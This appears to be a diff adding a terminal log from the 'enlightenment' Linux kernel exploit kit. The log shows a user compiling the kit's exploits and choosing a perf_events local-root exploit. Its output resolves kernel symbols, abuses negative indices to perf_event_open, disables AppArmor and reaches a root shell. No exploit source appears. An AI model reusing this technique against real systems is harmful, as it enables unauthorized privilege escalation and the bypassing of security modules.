@@ -1,0 +1,50 @@
+spender@ubuntu:~/enlightenment$ id
+uid=1000(spender) gid=1000(spender) groups=1000(spender),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+spender@ubuntu:~/enlightenment$ ./run_nonnull_exploits.sh 
+Compiling exp_abacus.c...OK.
+Compiling exp_cheddarbay.c...OK.
+Compiling exp_ingom0wnar.c...OK.
+Compiling exp_moosecox.c...OK.
+Compiling exp_paokara.c...OK.
+Compiling exp_powerglove.c...OK.
+Compiling exp_sieve.c...OK.
+Compiling exp_therebel.c...OK.
+Compiling exp_vmware.c...failed.
+Compiling exp_wunderbar.c...OK.
+Choose your exploit:
+ [0] Abacus: Linux 2.6.37 -> 3.8.9 PERF_EVENTS local root
+ [1] Ingo m0wnar: Linux 2.6.31 perf_counter local root (Ingo backdoor method)
+ [2] Sieve: Linux 2.6.18+ move_pages() infoleak
+ [3] Exit
+> 0
+ ------------------------------------------------------------------------------
+ We forfeit three-quarters of ourselves in order to be like other people.
+ --Schopenhauer
+ ------------------------------------------------------------------------------
+ [+] Resolved selinux_enforcing to 0xffffffff81f06c4c
+ [+] Resolved selinux_enabled to 0xffffffff81f06c48
+ [+] Resolved apparmor_enabled to 0xffffffff81c69929
+ [+] Resolved security_ops to 0xffffffff81f05400
+ [+] Resolved default_security_ops to 0xffffffff81c63a00
+ [+] Resolved sel_read_enforce to 0xffffffff812c4b40
+ [+] Resolved audit_enabled to 0xffffffff81e7a58c
+ [+] Resolved commit_creds to 0xffffffff8107ee30
+ [+] Resolved prepare_kernel_cred to 0xffffffff8107f0c0
+ [+] Resolved xen_start_info to 0xffffffff81dd8d48
+ [+] Resolved mark_rodata_ro to 0xffffffff81044000
+ [+] Resolved set_kernel_text_ro to 0xffffffff81043fb0
+ [+] Resolved make_lowmem_page_readonly to 0xffffffff81009c00
+ [+] Resolved make_lowmem_page_readwrite to 0xffffffff81009c40
+ [+] Submitting index of -1 to perf_event_open
+ [+] Submitting index of -2 to perf_event_open
+ [+] Array base is 0xffffffff81ef5940
+ [+] Targeting 0xffffffff81dd6048
+ [+] Submitting index of -49077 to perf_event_open
+ [+] Got ring0!
+ [+] Detected cred support
+ [+] Disabled security of :  AppArmor LSM
+ [+] Got root!
+root@ubuntu:/home/spender/enlightenment#id
+uid=0(root) gid=0(root) groups=0(root)
+
+
